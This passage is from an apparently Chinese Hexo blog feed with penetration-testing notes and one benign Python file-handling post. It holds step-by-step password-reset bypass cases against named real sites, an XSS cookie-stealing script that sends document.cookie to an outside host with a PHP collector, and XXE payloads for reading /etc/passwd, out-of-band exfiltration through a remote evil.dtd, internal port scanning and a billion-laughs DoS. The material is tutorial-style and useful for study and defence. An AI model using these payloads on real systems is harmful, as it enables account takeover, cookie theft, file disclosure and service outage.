    <content type="html"><![CDATA[<h2 id="任意用户密码重置"><a href="#任意用户密码重置" class="headerlink" title="任意用户密码重置"></a>任意用户密码重置</h2><h3 id="1-案例"><a href="#1-案例" class="headerlink" title="1.案例"></a>1.案例</h3><p>1.百度某站任意用户密码重置<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0207468.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0207468.html</a><br>（1）抓重置密码数据包<br>（2）查看数据包中的token<br>（3）查看url中标识身份的数据段<br>（4）发现token与url数据段是一致！！<br>（5）通过使用token构造url进行密码重置<br>2.米鼠网任意用户密码重置<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0211505.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0211505.html</a><br>（1）访问密码找回页面<br>（2）随便输名字burp抓包<br>（3）查看到手机号在请求包和源    代码中<br>（4）查看源代码<br>（5）分析js源码，在验证下一步有一个链接<br>（6）访问该链接成功绕过验证可以修改密码<br>3.国美<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0205445.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0205445.html</a><br>（1）忘记密码提交数据抓取数据包<br>（2）能看到数据包内容有手机号<br>（3）改为自己的<br>（4）短信接收ok<br>（5）密码为1234<br>4.盒子支付某站<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0204835.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2016-0204835.html</a><br>（1）忘记密码提交抓取数据包<br>（2）发送已有手机号，乌云曾经漏洞<br>（3）随便发送验证码，抓返回包<br>（4）显然验证码错误<br>（5）但是json字段将status改为1<br>（6）成功进入下一个页面</p><h3 id="1-2-文章总结"><a href="#1-2-文章总结" class="headerlink" title="1.2.文章总结"></a>1.2.文章总结</h3><p><a href="http://www.anquan.us/static/drops/papers-2035.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-2035.html</a><br>3种类型，爆破秒改和交互<br>爆破类型：（现在应该少）<br>爆破验证码<br>秒改类型：<br>给指定邮箱发送验证url链接<br>有两个参数：用户名+加密的字符串，一般在最后一步进行偷梁换柱</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任意用户密码重置&quot;&gt;&lt;a href=&quot;#任意用户密码重置&quot; class=&quot;headerlink&quot; title=&quot;任意用户密码重置&quot;&gt;&lt;/a&gt;任意用户密码重置&lt;/h2&gt;&lt;h3 id=&quot;1-案例&quot;&gt;&lt;a href=&quot;#1-案例&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>XSS利用</title>
    <link href="http://yoursite.com/2019/07/22/XSS%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/07/22/XSS利用/</id>
    <published>2019-07-22T03:57:10.000Z</published>
    <updated>2019-07-22T03:57:10.553Z</updated>
    
    <content type="html"><![CDATA[<h2 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h2><p>get.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.createElement(&apos;img&apos;).src=&apos;http://192.168.138.1:8001/get.php?cookie=&apos; + document.cookie + &apos;&gt;&apos;</span><br></pre></td></tr></table></figure></p><p>get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$text = file_get_contents(&quot;./cookie.txt&quot;);</span><br><span class="line"></span><br><span class="line">$text = $text . &quot;\n&quot; . $_GET[&apos;cookie&apos;];</span><br><span class="line"></span><br><span class="line">file_put_contents(&quot;./cookie.txt&quot;, $text);</span><br></pre></td></tr></table></figure></p><p>插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=192.168.169.149:8001/get.js&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;窃取cookie&quot;&gt;&lt;a href=&quot;#窃取cookie&quot; class=&quot;headerlink&quot; title=&quot;窃取cookie&quot;&gt;&lt;/a&gt;窃取cookie&lt;/h2&gt;&lt;p&gt;get.js&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python脚本-自动上传到hexo</title>
    <link href="http://yoursite.com/2019/07/20/python%E8%84%9A%E6%9C%AC-%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%88%B0hexo/"/>
    <id>http://yoursite.com/2019/07/20/python脚本-自动上传到hexo/</id>
    <published>2019-07-20T14:05:42.000Z</published>
    <updated>2019-07-20T14:07:56.251Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、压缩与解压"><a href="#一、压缩与解压" class="headerlink" title="一、压缩与解压"></a>一、压缩与解压</h2><p>导入相应模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import shutil</span><br><span class="line">import zipfile</span><br><span class="line">from os.path import join, getsize</span><br></pre></td></tr></table></figure></p><h3 id="1-python压缩指定文件夹"><a href="#1-python压缩指定文件夹" class="headerlink" title="1. python压缩指定文件夹"></a>1. python压缩指定文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def zip_file(src_dir):</span><br><span class="line">    zip_name = src_dir +&apos;.zip&apos;</span><br><span class="line">    z = zipfile.ZipFile(zip_name,&apos;w&apos;,zipfile.ZIP_DEFLATED)</span><br><span class="line">    for dirpath, dirnames, filenames in os.walk(src_dir):</span><br><span class="line">        fpath = dirpath.replace(src_dir,&apos;&apos;)</span><br><span class="line">        fpath = fpath and fpath + os.sep or &apos;&apos;</span><br><span class="line">        for filename in filenames:</span><br><span class="line">            z.write(os.path.join(dirpath, filename),fpath+filename)</span><br><span class="line">            print (&apos;==压缩成功==&apos;)</span><br><span class="line">    z.close()</span><br></pre></td></tr></table></figure><p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src_dir：你要压缩的文件夹的路径</span><br><span class="line">zip_name：压缩后zip文件的路径及名称</span><br></pre></td></tr></table></figure></p><h3 id="2-python解压zip"><a href="#2-python解压zip" class="headerlink" title="2. python解压zip"></a>2. python解压zip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def unzip_file(zip_src, dst_dir):</span><br><span class="line">    r = zipfile.is_zipfile(zip_src)</span><br><span class="line">    if r:     </span><br><span class="line">        fz = zipfile.ZipFile(zip_src, &apos;r&apos;)</span><br><span class="line">        for file in fz.namelist():</span><br><span class="line">            fz.extract(file, dst_dir)       </span><br><span class="line">    else:</span><br><span class="line">        print(&apos;This is not zip&apos;)</span><br></pre></td></tr></table></figure><p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip_src:是zip文件的全路径</span><br><span class="line"> </span><br><span class="line">dst_dir：是要解压到的目的文件夹</span><br></pre></td></tr></table></figure></p><h2 id="二、操作文件方法"><a href="#二、操作文件方法" class="headerlink" title="二、操作文件方法"></a>二、操作文件方法</h2><h3 id="1-剪切（移动）文件到指定目录"><a href="#1-剪切（移动）文件到指定目录" class="headerlink" title="1.剪切（移动）文件到指定目录"></a>1.剪切（移动）文件到指定目录</h3><p>主要通过os和shutil库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.move(filename, dst_dir)</span><br></pre></td></tr></table></figure></p><h3 id="2-删除文件夹"><a href="#2-删除文件夹" class="headerlink" title="2.删除文件夹"></a>2.删除文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.rmtree(src_dir)</span><br></pre></td></tr></table></figure><h3 id="3-删除指定文件"><a href="#3-删除指定文件" class="headerlink" title="3.删除指定文件"></a>3.删除指定文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.remove(file_src)</span><br></pre></td></tr></table></figure><h3 id="4-新建文件夹"><a href="#4-新建文件夹" class="headerlink" title="4.新建文件夹"></a>4.新建文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(dst_dir)</span><br></pre></td></tr></table></figure><h3 id="5-遍历文件夹"><a href="#5-遍历文件夹" class="headerlink" title="5.遍历文件夹"></a>5.遍历文件夹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for filename in os.listdir(src_dir):</span><br></pre></td></tr></table></figure><h3 id="6-复制文件"><a href="#6-复制文件" class="headerlink" title="6.复制文件"></a>6.复制文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copyfile(src_file,dst_file)</span><br></pre></td></tr></table></figure><h2 id="三、python文件乱码问题"><a href="#三、python文件乱码问题" class="headerlink" title="三、python文件乱码问题"></a>三、python文件乱码问题</h2><h3 id="1-读文件"><a href="#1-读文件" class="headerlink" title="1.读文件"></a>1.读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(filename,&apos;r&apos;,encoding=&apos;UTF-8&apos;) as fp:</span><br><span class="line">s = fp.read()</span><br></pre></td></tr></table></figure><h3 id="2-写文件"><a href="#2-写文件" class="headerlink" title="2.写文件"></a>2.写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;D:/hexo/source/_posts/%s&quot; % filename,&apos;w&apos;,encoding=&quot;UTF-8&quot;) as f:</span><br><span class="line">f.write(result)</span><br></pre></td></tr></table></figure><h3 id="3-注意"><a href="#3-注意" class="headerlink" title="3.注意"></a>3.注意</h3><p>记得加encoding=”UTF-8”，不然会出现乱码问题。</p><h2 id="四、获取当前时间"><a href="#四、获取当前时间" class="headerlink" title="四、获取当前时间"></a>四、获取当前时间</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、压缩与解压&quot;&gt;&lt;a href=&quot;#一、压缩与解压&quot; class=&quot;headerlink&quot; title=&quot;一、压缩与解压&quot;&gt;&lt;/a&gt;一、压缩与解压&lt;/h2&gt;&lt;p&gt;导入相应模块&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;
      
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>PHP XXE</title>
    <link href="http://yoursite.com/2019/07/20/PHP%20XXE/"/>
    <id>http://yoursite.com/2019/07/20/PHP XXE/</id>
    <published>2019-07-20T13:57:20.000Z</published>
    <updated>2019-07-20T13:57:20.765Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xml是什么"><a href="#xml是什么" class="headerlink" title="xml是什么"></a>xml是什么</h2><p>XML指可扩展标记语言<br>用处：被设计用来传输和存储数据。<br>与HTML区别：HTML是被设计用来显示数据，HTML具有特效，XML用来传输数据<br>XML 标签没有被预定义。需要自行定义标签<br>XML 被设计为具有自我描述性</p><h2 id="一个XML文档实例"><a href="#一个XML文档实例" class="headerlink" title="一个XML文档实例"></a>一个XML文档实例</h2><p>第一行是xml声明，定义版本和使用编码<br>第二行是根元素，一个xml文档必须拥有根元素<br>其下几行是子元素<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h2 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h2><ol><li>所有XML元素都必须有关闭标签</li><li>XML标签对大小写敏感</li><li>XML必须正确嵌套</li><li>XML文档必须有根元素</li><li>XML的属性值必须加引号</li><li>有些特殊符号需要进行实体引用<br>在XML中的5个预定义实体引用<br><img src="/img/1543499945581.png" alt=""></li><li>xml也有注释与html注释一样</li><li>在xml中多个空格是会被保留的</li><li>xml可以有自闭和标签</li></ol><h2 id="XML-DTD学习"><a href="#XML-DTD学习" class="headerlink" title="XML DTD学习"></a>XML DTD学习</h2><p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。<br>DTD可以被成行地声明于XML文档中，也可作为一个外部引用。</p><h2 id="内部的DOCTYPE声明"><a href="#内部的DOCTYPE声明" class="headerlink" title="内部的DOCTYPE声明"></a>内部的DOCTYPE声明</h2><p>语法声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure></p><p>带有DTD的XML文档实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>以上 DTD 解释如下：<br>!DOCTYPE note (第二行)定义此文档是 note 类型的文档。</p><p>!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”</p><p>!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型</p><h2 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h2><p>假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="DTD构建模块"><a href="#DTD构建模块" class="headerlink" title="DTD构建模块"></a>DTD构建模块</h2><p>所有的XML文档均有以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA（实体会被XML解析器所解析）</li><li>CDATA（实体不会被解析）</li></ul><h2 id="DTD属性"><a href="#DTD属性" class="headerlink" title="DTD属性"></a>DTD属性</h2><p>语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure></p><h2 id="DTD实体（漏洞点）"><a href="#DTD实体（漏洞点）" class="headerlink" title="DTD实体（漏洞点）"></a>DTD实体（漏洞点）</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的<strong>变量</strong>。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p><p><strong>内部实体语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>内部实体声明例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;kage&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright bu1uokage.cn&quot;&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure></p><p><strong>外部实体语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>外部实体引用例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>外部实体支持的协议<br><img src="/img/1543746778920.png" alt=""><br>php扩展协议<br><img src="/img/1543746812561.png" alt=""></p><p><strong>参数实体</strong><br>参数实体只能在DTD中使用。<br>语法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure></p><hr><h2 id="PHP的XML解析"><a href="#PHP的XML解析" class="headerlink" title="PHP的XML解析"></a>PHP的XML解析</h2><h2 id="DOM解析"><a href="#DOM解析" class="headerlink" title="DOM解析"></a>DOM解析</h2><ol><li><p>得到面(整个文档)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$xml = new Domdocument(&apos;1.0&apos;,&apos;utf-8&apos;);</span><br><span class="line">$xml-&gt;load(&apos;xxx.xml&apos;);</span><br></pre></td></tr></table></figure></li><li><p>得到串(节点列表对象,nodelist Object)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$xml-&gt;getElementsByTagName(&apos;节点名&apos;)</span><br></pre></td></tr></table></figure></li><li><p>得到点(节点/元素)<br>$nodelist-&gt;item(0/1/2….);</p><h2 id="simpleXML解析"><a href="#simpleXML解析" class="headerlink" title="simpleXML解析"></a>simpleXML解析</h2><p>simpleXML解析XML文件非常简单，<br>因为它一次性把XML文档解析成一个大对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$simxml = simplexml_load_file(&apos;./book.xml&apos;);</span><br><span class="line">$simxml = simplexml_load_string($xml);</span><br></pre></td></tr></table></figure></li></ol><h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><p>XXE也就是外部实体注入漏洞，通常发生在web服务器在接收解析用户XML输入时，没有对文件内容进行过滤，禁止外部实体加载，导致造成任意文件读取、DOS、命令执行、内网端口扫描等危害。</p><h2 id="有回显的任意文件读取"><a href="#有回显的任意文件读取" class="headerlink" title="有回显的任意文件读取"></a>有回显的任意文件读取</h2><p>用于解析xml的php文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$body = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">$xml = simplexml_load_string($body);</span><br><span class="line">var_dump($xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以看到，服务器解析了我们的xml并进行回显<br><img src="/img/1543743770044.png" alt=""><br>方法一：直接通过DTD外部实体声明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;file;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/1543743949519.png" alt=""><br>方法二：将DTD放在我们的服务器端，让目标web服务器加载我们的DTD文件<br>xml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;b;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><p>dtd:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure></p><h2 id="无回显的任意文件读取"><a href="#无回显的任意文件读取" class="headerlink" title="无回显的任意文件读取"></a>无回显的任意文件读取</h2><p>无回显的任意文件读取需要我们自己构造一条外带OOB通道，具体就是，让目标服务器将文件内容赋值到参数实体中，再通过外部实体发送GET请求给我们的vps，我们写脚本或者通过vps日志文件就能获取信息。<br>xml内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><p>evil.dtd内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://www.silky.fun/evil.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p><p>发送<br><img src="/img/1543745180681.png" alt=""><br>从access.log查看回显<br><img src="/img/1543745021636.png" alt=""></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY port SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;port;&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>我们知道80端口是开放的，这时页面会返回报错信息如下：<br><img src="/img/1543745894729.png" alt=""><br>检测3389端口是没开放的，报错如下：<br><img src="/img/1543745945842.png" alt=""></p><h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;!DOCTYPE lolz [</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line"></span><br><span class="line"> ]&gt;</span><br><span class="line"> </span><br><span class="line"> 